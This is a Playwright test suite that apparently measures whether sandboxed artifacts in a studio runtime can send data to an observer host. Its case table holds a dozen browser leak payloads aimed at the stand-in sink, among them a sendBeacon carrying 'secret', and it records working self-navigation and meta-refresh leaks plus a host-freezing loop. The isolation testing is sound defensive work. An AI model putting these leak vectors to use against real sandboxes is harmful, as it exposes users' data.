import { test as base, expect } from '@playwright/test'
import { startFixture, studio, runtime, sink, script } from './fixture'

type Fixture = Awaited<ReturnType<typeof startFixture>>
const test = base.extend<{ fixture: Fixture }>({
  fixture: async ({}, use) => {
    const fixture = await startFixture()
    try { await use(fixture) } finally { await fixture.close() }
  },
  context: async ({ browser, fixture }, use) => {
    const context = await browser.newContext({ proxy: { server: fixture.proxy }, ignoreHTTPSErrors: true })
    try { await use(context) } finally { await context.close() }
  },
})
const cases: Record<string, string> = {
  fetch: script(`fetch('${sink}/fetch').catch(()=>{})`),
  beacon: script(`try{navigator.sendBeacon('${sink}/beacon','secret')}catch{}`),
  websocket: script(`try{new WebSocket('wss://sink.observer.test/ws')}catch{}`),
  image: script(`new Image().src='${sink}/image'`),
  css: `<style>@import url('${sink}/css');@font-face{font-family:x;src:url('${sink}/font')}p{font-family:x}</style><p>x</p>`,
  form: `<form action="${sink}/form" id="f"></form><script>f.submit()</script>`,
  popup: script(`window.open('${sink}/popup')`),
  blank: `<a id="a" target="_blank" href="${sink}/blank">go</a><script>a.click()</script>`,
  top: script(`try{top.location='${sink}/top'}catch{}`),
  worker: script(`try{new Worker(URL.createObjectURL(new Blob(["fetch('${sink}/worker')"])))}catch{}`),
  child: `<iframe src="${sink}/child"></iframe>`,
  download: script(`const a=document.createElement('a');a.href=URL.createObjectURL(new Blob(['x']));a.download='x';a.click()`),
}
test('observer positive control records HTTPS requests', async ({ page, fixture }) => {
  await page.goto(`${sink}/control`)
  expect(fixture.hits).toContain('/control')
})

for (const mode of ['frame', 'top'] as const) {
  for (const [name, body] of Object.entries(cases)) {
    test(`${mode}: measured ${name} attempt ${mode === "top" && name === "top" ? "escapes through self navigation" : "is blocked"}`, async ({ page, context, fixture }) => {
      fixture.documents.set('/case', body)
      let downloads = 0
      page.on('download', () => downloads++)
      await page.goto(studio)
      if (mode === 'top') {
        await page.goto(`${runtime}/case?top`)
        if (name !== 'top') await expect.poll(() => page.evaluate(() => (window as unknown as { __ready: boolean }).__ready)).toBe(true)
      }
      else {
        await page.evaluate(url => {
          const frame = document.createElement('iframe')
          frame.sandbox.add('allow-scripts'); frame.src = url; document.body.append(frame)
        }, `${runtime}/case`)
        await expect.poll(() => page.evaluate(() => (window as unknown as { ready: string[] }).ready.includes('/case'))).toBe(true)
      }
      await page.waitForTimeout(400) // bounded observation window, not an egress proof
      if (mode === "top" && name === "top") expect(fixture.hits).toContain("/top")
      else expect(fixture.hits).toEqual([])
      expect(context.pages()).toHaveLength(1)
      expect(downloads).toBe(0)
      if (mode === 'frame') expect(page.url()).toBe(`${studio}/`)
    })
  }
}

for (const mode of ['frame', 'top'] as const) {
  for (const destination of ['204', 'redirect', 'stall']) {
    test(`${mode}: self navigation /${destination} reaches sink without requiring a second load`, async ({ page, fixture }) => {
      fixture.documents.set('/case', script(`location.href='${sink}/${destination}'`))
      if (mode === 'top') await page.goto(`${runtime}/case?top`, { waitUntil: 'commit' })
      else {
        await page.goto(studio)
        await page.evaluate(url => {
          const f = document.createElement('iframe'); f.sandbox.add('allow-scripts');
          f.id = 'artifact'; f.src = url; document.body.append(f)
        }, `${runtime}/case`)
      }
      // Characterizes a known CSP gap. Immediate navigation, redirects, 204 and
      // stalled responses can leak before any second iframe load event exists.
      await expect.poll(() => fixture.hits.includes(`/${destination}`)).toBe(true)
      if (mode === 'frame') {
        expect(page.url()).toBe(`${studio}/`)
        await page.locator('#artifact').evaluate(el => el.remove())
      }
    })
  }
}

test('preconnect observation is explicitly inconclusive', async ({ page, fixture }, info) => {
  fixture.documents.set('/case', `<link rel="preconnect" href="${sink}"><link rel="prefetch" href="${sink}/prefetch">`)
  await page.goto(`${runtime}/case?top`)
  await page.waitForTimeout(400)
  await info.attach('network-hints.json', { body: JSON.stringify({ httpHits: fixture.hits, connectTunnels: fixture.tunnels, verdict: 'inconclusive: a CONNECT is observable, but absence does not prove no DNS/TCP speculation; browser hint support varies' }), contentType: 'application/json' })
  info.annotations.push({ type: 'inconclusive', description: 'No universal preconnect isolation claim; HTTP sink alone cannot measure it.' })
})

test('separate runtime tab loop leaves Studio responsive and can be closed', async ({ page, context, fixture }) => {
  fixture.documents.set('/loop', script('setTimeout(()=>{console.log("artifact-loop-started");for(;;){}},300)'))
  await page.goto(studio)
  const tab = await context.newPage()
  const started = tab.waitForEvent('console', { predicate: message => message.text() === 'artifact-loop-started', timeout: 5000 })
  await tab.goto(`${runtime}/loop?top`)
  await started
  await page.bringToFront()
  await page.waitForTimeout(700)
  // A frozen renderer times out the test and exits nonzero, never a result PASS.
  const baseline = await page.evaluate(() => (window as unknown as { ticks: number }).ticks)
  await expect.poll(() => page.evaluate(() => (window as unknown as { ticks: number }).ticks)).toBeGreaterThan(baseline + 5)
  await tab.close({ runBeforeUnload: false })
  await expect(page).toHaveTitle('studio')
  const after = await page.evaluate(() => (window as unknown as { ticks: number }).ticks)
  await expect.poll(() => page.evaluate(() => (window as unknown as { ticks: number }).ticks)).toBeGreaterThan(after + 5)
})

test('cross-site iframe loop characterizes supported and unsupported host isolation', async ({ page, fixture, browserName }, info) => {
  fixture.documents.set('/loop', script('setTimeout(()=>{console.log("artifact-loop-started");for(;;){}},300)'))
  await page.goto(studio)
  const started = page.waitForEvent('console', { predicate: message => message.text() === 'artifact-loop-started', timeout: 5000 })
  await page.evaluate(url => {
    const frame = document.createElement('iframe'); frame.sandbox.add('allow-scripts')
    frame.id = 'artifact'; frame.src = url; document.body.append(frame)
  }, `${runtime}/loop`)
  await expect.poll(() => page.evaluate(() => (window as unknown as { ready: string[] }).ready.includes('/loop'))).toBe(true)
  await started
  await page.waitForTimeout(700)
  // This is a capability experiment, not permission to enable scripts. In the
  // pinned Firefox/WebKit builds the host shares the blocked renderer. Measure
  // that exact limitation; never treat an arbitrary setup/assertion failure as
  // an expected pass. The separate-tab and production-static tests remain
  // mandatory in all engines. Interactive product execution is still disabled.
  let probeTimer: ReturnType<typeof setTimeout> | undefined
  const probe = page.evaluate(() => (window as unknown as { ticks: number }).ticks)
    .then(ticks => ({ kind: 'responsive' as const, ticks }), error => ({ kind: 'error' as const, error: String(error) }))
  const result = await Promise.race([
    probe,
    new Promise<{ kind: 'blocked' }>(resolve => { probeTimer = setTimeout(() => resolve({ kind: 'blocked' }), 2000) }),
  ])
  clearTimeout(probeTimer)
  await info.attach('iframe-host-isolation.json', {
    body: JSON.stringify({ browserName, result, productMode: 'static', observationMs: 2000 }),
    contentType: 'application/json',
  })
  if (browserName !== 'chromium') {
    expect(result.kind, 'Known unsupported iframe isolation changed; review the runtime policy and measurements').toBe('blocked')
    info.annotations.push({ type: 'known-limitation', description: 'Scripted iframe freezes the host in this engine. Inline interactive runtime must remain disabled; a future separate-tab fallback needs its own product acceptance.' })
    return
  }
  expect(result.kind, 'Chromium host must stay responsive during the artifact loop').toBe('responsive')
  if (result.kind !== 'responsive') throw new Error('Host renderer did not respond')
  const baseline = result.ticks
  await expect.poll(() => page.evaluate(() => (window as unknown as { ticks: number }).ticks)).toBeGreaterThan(baseline + 5)
  await page.locator('#artifact').evaluate(el => el.remove())
  await expect(page.locator('#artifact')).toHaveCount(0)
  await expect(page).toHaveTitle('studio')
  const after = await page.evaluate(() => (window as unknown as { ticks: number }).ticks)
  await expect.poll(() => page.evaluate(() => (window as unknown as { ticks: number }).ticks)).toBeGreaterThan(after + 5)
})

for (const mode of ['frame', 'top'] as const) {
  test(`${mode}: meta refresh reaches observer`, async ({ page, fixture }) => {
    fixture.documents.set('/refresh', `<meta http-equiv="refresh" content="0;url=${sink}/refresh">`)
    if (mode === 'top') await page.goto(`${runtime}/refresh?top`, { waitUntil: 'commit' })
    else {
      await page.goto(studio)
      await page.evaluate(url => { const f=document.createElement('iframe'); f.sandbox.add('allow-scripts'); f.src=url; document.body.append(f) }, `${runtime}/refresh`)
    }
    await expect.poll(() => fixture.hits.includes('/refresh')).toBe(true)
  })
}
